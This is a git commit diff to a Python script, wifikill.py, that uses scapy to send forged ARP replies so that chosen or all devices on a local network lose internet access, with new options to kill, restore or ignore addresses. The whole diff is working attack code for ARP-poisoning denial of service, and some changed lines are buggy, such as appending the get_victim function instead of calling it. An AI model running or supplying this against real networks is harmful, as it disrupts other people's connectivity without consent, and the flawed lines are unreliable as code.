6fb5e82850981e57c6485380882fc9040187d21c
MrEO <mistereo@hotmail.com>
2018-04-17 16:27:03 +0800

    update arg function

--- wifikill.py
+++ wifikill.py
@@ -32,20 +32,24 @@ def get_ip_macs(ips):
     return res
 
 
-def poison(victim_ip, victim_mac, gateway_ip):
+def poison(victim_ip, victim_mac, gateway_ip, details=False):
     # Send the victim an ARP packet pairing the gateway ip with the wrong
     # mac address
     packet = ARP(op=2, psrc=gateway_ip, hwsrc='12:34:56:78:9A:BC',
                  pdst=victim_ip, hwdst=victim_mac)
     send(packet, verbose=0)
+    if details:
+        print('poisoned\t{}\t{}'.format(victim_ip, victim_mac))
 
 
-def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
+def restore(victim_ip, victim_mac, gateway_ip, gateway_mac, details=False):
     # Send the victim an ARP packet pairing the gateway ip with the correct
     # mac address
     packet = ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac,
                  pdst=victim_ip, hwdst=victim_mac)
     send(packet, verbose=0)
+    if details:
+        print('restored\t{}\t{}'.format(victim_ip, victim_mac))
 
 
 def get_lan_ip():
@@ -65,16 +69,20 @@ def printdiv():
 import argparse
 parser = argparse.ArgumentParser(
     description='A python program that uses scapy to kick people off of wifi')
-parser.add_argument('-k', help="kill the address",
-                    action='append', metavar='ip|mac')
-parser.add_argument(
-    '-a', help='kill all addresses in the LAN', action='store_true')
-parser.add_argument('-i', help='ignore the address',
-                    action='append', metavar='ip|mac')
-parser.add_argument('-r', help='restore the address',
-                    action='append', metavar='ip|mac')
-parser.add_argument('--lan', help='manually specify the lan ip',
-                    action='append', metavar='ip')
+
+group = parser.add_mutually_exclusive_group()
+group.add_argument('-k', help="kill the address",
+                   metavar='ip|mac', nargs='+')
+group.add_argument('-r', help='restore the address',
+                   metavar='ip|mac', nargs='+')
+group.add_argument(
+    '-ka', help='kill all addresses in the LAN', action='store_true')
+group.add_argument(
+    '-ra', help='restore all addresses', action='store_true')
+parser.add_argument('-ig', help='ignore the address',
+                    metavar='ip|mac', nargs='+')
+parser.add_argument('--details', help='show kill details', action='store_true')
+parser.add_argument('--lan', help='manually specify the lan ip', metavar='ip')
 args = parser.parse_args()
 
 # Check for root
@@ -86,10 +94,13 @@ if os.geteuid() != 0:
 refreshing = True
 gateway_mac = '12:34:56:78:9A:BC'  # A default (bad) gateway mac address
 while refreshing:
+    refreshing = False
     # Use the current ip XXX.XXX.XXX.XXX and get a string in
     # the form "XXX.XXX.XXX.*" and "XXX.XXX.XXX.1". Right now,
     # the script assumes that the default gateway is "XXX.XXX.XXX.1"
     myip = get_lan_ip()
+    if args.lan:
+        myip = args.lan
     ip_list = myip.split('.')
     del ip_list[-1]
     ip_list.append('*')
@@ -119,61 +130,103 @@ while refreshing:
             'Gateway not found. Script will be UNABLE TO RESTORE WIFI once shutdown is over')
     printdiv()
 
+    ignores = args.ig
+    if ignores:
+        print('ignore list: {}'.format(ignores))
+    printdiv()
+
     # Get a choice and keep prompting until we get a valid letter or a number
     # that is in range
-    print('Who do you want to boot?')
-    print('(r - Refresh, a - Kill all, q - quit)')
+    kill = True
+    kill_list = []
 
-    input_is_valid = False
-    killall = False
-    while not input_is_valid:
-        choice = input(">")
-        assert isinstance(choice, str)
-        if choice.isdigit():
-            # If we have a number, see if it's in the range of choices
-            if int(choice) < len(devices) and int(choice) >= 0:
-                refreshing = False
-                input_is_valid = True
-        elif choice is 'a':
-            # If we have an a, set the flag to kill everything
-            killall = True
-            input_is_valid = True
-            refreshing = False
-        elif choice is 'r':
-            # If we have an r, say we have a valid input but let everything
-            # refresh again
-            input_is_valid = True
-        elif choice is 'q':
-            # If we have a q, just quit. No cleanup required
-            exit()
+    def get_victim(address):
+        for device in devices:
+            if address == device[0] or address == devices[1]:
+                return device
 
-        if not input_is_valid:
+    if args.ka:
+        kill_list = devices
+    elif args.ra:
+        kill = False
+        kill_list = devices
+    elif args.k:
+        for address in args.k:
+            kill_list.append(get_victim)
+    elif args.r:
+        kill = False
+        for address in args.r:
+            kill_list.append(get_victim)
+    else:
+        print('Who do you want to boot?')
+        print('(r - Refresh, a - Kill all, ra - Restore all, q - quit)')
+
+        while True:
+            choice = input(">")
+            print(choice)
+            assert isinstance(choice, str)
+
+            def kill_append(num):
+                # If we have a number, see if it's in the range of choices
+                if num < len(devices) and num >= 0:
+                    victim = devices[num]
+                    kill_list.append(victim)
+
+            if choice.isdigit():
+                kill_append(int(choice))
+                break
+            elif choice.find(' ') != -1:
+                for num in [int(n) for n in choice.split()]:
+                    kill_append(num)
+                break
+            elif choice is 'a':
+                # If we have an a, set the flag to kill everything
+                kill_list = devices
+                break
+            elif choice is 'r':
+                # If we have an r, say we have a valid input but let everything
+                # refresh again
+                refreshing = True
+                break
+            elif choice == 'ra':
+                kill = False
+                kill_list = devices
+                break
+            elif choice is 'q':
+                # If we have a q, just quit. No cleanup required
+                exit()
+
             print('Please enter a valid choice')
 
-# Once we have a valid choice, we decide what we're going to do with it
-if choice.isdigit():
+
+if kill:
     # If we have a number, loop the poison function until we get a
     # keyboard inturrupt (ctrl-c)
-    choice = int(choice)
-    victim = devices[choice]
-    print('Preventing {} from accessing the internet...'.format(victim[0]))
     try:
+        print('Killing')
         while True:
-            poison(victim[0], victim[1], gateway_ip)
+            for victim in kill_list:
+                if victim[0] in ignores or victim[1] in ignores:
+                    if args.details:
+                        print('-ignored\t{}\t{}'.format(victim[0], victim[1]))
+                    continue
+                poison(victim[0], victim[1], gateway_ip, details=args.details)
     except KeyboardInterrupt:
         print('Restoring')
-        restore(victim[0], victim[1], gateway_ip, gateway_mac)
+        for victim in kill_list:
+            if victim[0] in ignores or victim[1] in ignores:
+                if args.details:
+                    print('-ignored\t{}\t{}'.format(victim[0], victim[1]))
+                continue
+            restore(victim[0], victim[1], gateway_ip,
+                    gateway_mac, details=args.details)
         print('\nYou\'re welcome!')
-elif killall:
-    # If we are going to kill everything, loop the poison function until we
-    # we get a keyboard inturrupt (ctrl-c)
-    print('Preventing everyone from accessing the internet...')
-    try:
-        while True:
-            for victim in devices:
-                poison(victim[0], victim[1], gateway_ip)
-    except KeyboardInterrupt:
-        print('Restoring')
-        for victim in devices:
-            restore(victim[0], victim[1], gateway_ip, gateway_mac)
-        print('\nYou\'re welcome!')
+else:
+    print('Restoring')
+    for victim in kill_list:
+        if victim[0] in ignores or victim[1] in ignores:
+            if args.details:
+                print('-ignored\t{}\t{}'.format(victim[0], victim[1]))
+            continue
+        restore(victim[0], victim[1], gateway_ip,
+                gateway_mac, details=args.details)
